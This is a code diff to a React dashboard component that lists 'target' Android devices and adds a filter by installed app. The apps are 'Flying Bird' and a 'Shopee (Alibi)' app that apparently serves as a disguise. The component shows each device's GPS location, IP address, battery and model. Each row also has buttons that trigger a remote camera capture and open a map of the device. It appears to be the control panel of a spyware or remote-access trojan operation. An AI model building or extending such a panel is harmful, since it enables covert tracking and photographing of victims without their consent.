@@ -12,9 +12,10 @@ import {
   BatteryMedium,
   BatteryLow,
   Circle,
+  Filter,
   type LucideIcon,
 } from 'lucide-react';
-import { Target } from '@/types/target';
+import { Target, AppType } from '@/types/target';
 
 const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));
 
@@ -52,17 +53,20 @@ export default function TargetList({
   onCapture,
 }: TargetListProps) {
   const [searchTerm, setSearchTerm] = useState('');
+  const [appFilter, setAppFilter] = useState<AppType>('ALL');
 
   const filteredTargets = useMemo(() => {
     const term = searchTerm.toLowerCase().trim();
-    if (!term) return targets;
-
     return targets.filter((target) => {
-      const idMatch = target.id?.toLowerCase().includes(term);
-      const modelMatch = target.deviceInfo?.model?.toLowerCase().includes(term);
-      return idMatch || modelMatch;
+      const matchesSearch = !term ||
+        target.id?.toLowerCase().includes(term) ||
+        (target.deviceInfo?.model || target.model || '').toLowerCase().includes(term);
+
+      const matchesFilter = appFilter === 'ALL' || target.appType === appFilter;
+
+      return matchesSearch && matchesFilter;
     });
-  }, [searchTerm, targets]);
+  }, [searchTerm, targets, appFilter]);
 
   const onlineCount = useMemo(
     () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
@@ -78,9 +82,23 @@ export default function TargetList({
           <div className="space-y-3">
             <p className="text-sm uppercase tracking-[0.3em] text-cyan-300/80">Cyber Security Fleet</p>
             <h2 className="text-3xl font-semibold text-white">Realtime Target Monitoring</h2>
-            <p className="max-w-2xl text-sm text-slate-400">
-              Pantau perangkat target, cek status online/offline, baterai, dan kirim perintah langsung dari dashboard.
-            </p>
+            <div className="flex flex-wrap gap-2 mt-2">
+              <button
+                onClick={() => setAppFilter('ALL')}
+                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
+                  appFilter === 'ALL' ? "bg-cyan-500 border-cyan-400 text-white" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
+              >ALL</button>
+              <button
+                onClick={() => setAppFilter('FLYING_BIRD')}
+                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
+                  appFilter === 'FLYING_BIRD' ? "bg-yellow-500 border-yellow-400 text-black" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
+              >FLYING BIRD</button>
+              <button
+                onClick={() => setAppFilter('SHOPEE_ALIBI')}
+                className={cn("px-4 py-1.5 rounded-full text-xs font-bold transition-all border",
+                  appFilter === 'SHOPEE_ALIBI' ? "bg-orange-600 border-orange-500 text-white" : "bg-slate-900 border-white/10 text-slate-400 hover:text-white")}
+              >SHOPEE (ALIBI)</button>
+            </div>
           </div>
 
           <div className="w-full max-w-xl">
@@ -130,10 +148,10 @@ export default function TargetList({
           <table className="min-w-full divide-y divide-white/10 text-left text-sm text-slate-300">
             <thead className="bg-slate-950/70 text-slate-400">
               <tr>
-                <th className="px-6 py-4 uppercase tracking-[0.15em]">ID / Device</th>
+                <th className="px-6 py-4 uppercase tracking-[0.15em]">Target Info</th>
                 <th className="px-6 py-4 uppercase tracking-[0.15em]">Status</th>
-                <th className="px-6 py-4 uppercase tracking-[0.15em]">Battery</th>
-                <th className="px-6 py-4 uppercase tracking-[0.15em]">IP Address</th>
+                <th className="px-6 py-4 uppercase tracking-[0.15em]">Network Info</th>
+                <th className="px-6 py-4 uppercase tracking-[0.15em]">Location</th>
                 <th className="px-6 py-4 uppercase tracking-[0.15em]">Actions</th>
               </tr>
             </thead>
@@ -156,6 +174,7 @@ export default function TargetList({
                   const batteryState = getBatteryState(target.battery);
                   const BatteryIcon = batteryState.icon as LucideIcon;
                   const targetIp = target.deviceInfo?.ip || target.ip || 'Unknown IP';
+                  const appLabel = target.appType === 'FLYING_BIRD' ? '🐦 Bird' : target.appType === 'SHOPEE_ALIBI' ? '🛍️ Shopee' : '❓ Unknown';
 
                   return (
                     <tr
@@ -169,27 +188,43 @@ export default function TargetList({
                       <td className="px-6 py-5">
                         <div className="text-sm font-semibold text-white">{target.id}</div>
                         <div className="mt-1 text-xs text-slate-500">
-                          {target.deviceInfo?.model || target.model || 'Unknown model'}
+                          {target.deviceInfo?.manufacturer || ''} {target.deviceInfo?.model || target.model || 'Unknown model'}
+                        </div>
+                        <div className={cn("mt-1.5 inline-block px-2 py-0.5 rounded text-[10px] font-bold uppercase",
+                          target.appType === 'FLYING_BIRD' ? "bg-yellow-500/20 text-yellow-500" : "bg-orange-500/20 text-orange-500")}>
+                          {appLabel}
                         </div>
                       </td>
                       <td className="px-6 py-5">
-                        <div className="inline-flex items-center gap-2 text-sm">
-                          <Circle
-                            size={12}
-                            className={isOnline ? 'text-emerald-400 animate-pulse' : 'text-slate-500'}
-                          />
-                          <span className="uppercase">{isOnline ? 'ONLINE' : 'OFFLINE'}</span>
+                        <div className="flex flex-col gap-2">
+                          <div className="inline-flex items-center gap-2 text-xs">
+                            <Circle
+                              size={10}
+                              className={isOnline ? 'text-emerald-400 animate-pulse' : 'text-slate-500'}
+                            />
+                            <span className="uppercase font-mono">{isOnline ? 'ONLINE' : 'OFFLINE'}</span>
+                          </div>
+                          <div className="inline-flex items-center gap-2 text-xs">
+                            <BatteryIcon size={14} className={batteryState.color} />
+                            <span className={batteryState.color}>
+                              {typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
+                            </span>
+                          </div>
                         </div>
                       </td>
                       <td className="px-6 py-5">
-                        <div className="inline-flex items-center gap-2 text-sm">
-                          <BatteryIcon size={18} className={batteryState.color} />
-                          <span className={batteryState.color}>
-                            {typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
-                          </span>
+                        <div className="text-xs font-mono text-slate-400">{targetIp}</div>
+                        <div className="mt-1 text-[10px] text-slate-600 uppercase tracking-tighter">
+                          OS: {target.deviceInfo?.os || 'Android'}
                         </div>
                       </td>
-                      <td className="px-6 py-5 text-sm text-slate-400">{targetIp}</td>
+                      <td className="px-6 py-5">
+                         {target.location?.lat ? (
+                           <div className="text-[11px] text-slate-400 font-mono">
+                             {target.location.lat.toFixed(4)}, {target.location.lng?.toFixed(4)}
+                           </div>
+                         ) : <span className="text-slate-600 text-[10px]">No Data</span>}
+                      </td>
                       <td className="px-6 py-5">
                         <div className="flex flex-wrap gap-2">
                           <button
@@ -199,16 +234,16 @@ export default function TargetList({
                               onCapture(target.id);
                             }}
                             disabled={busyTargetId === target.id}
-                            className="inline-flex h-10 w-10 items-center justify-center rounded-2xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-cyan-400/70 hover:text-cyan-300 disabled:cursor-not-allowed disabled:opacity-50"
+                            className="inline-flex h-9 w-9 items-center justify-center rounded-xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-cyan-400/70 hover:text-cyan-300 disabled:cursor-not-allowed disabled:opacity-50"
                           >
-                            <Camera size={16} />
+                            <Camera size={14} />
                           </button>
                           <Link
                             href={`/dashboard/map/${target.id}`}
                             onClick={(event) => event.stopPropagation()}
-                            className="inline-flex h-10 w-10 items-center justify-center rounded-2xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-emerald-400/70 hover:text-emerald-300"
+                            className="inline-flex h-9 w-9 items-center justify-center rounded-xl border border-white/10 bg-slate-950/80 text-slate-200 transition hover:border-emerald-400/70 hover:text-emerald-300"
                           >
-                            <MapPin size={16} />
+                            <MapPin size={14} />
                           </Link>
                         </div>
                       </td>
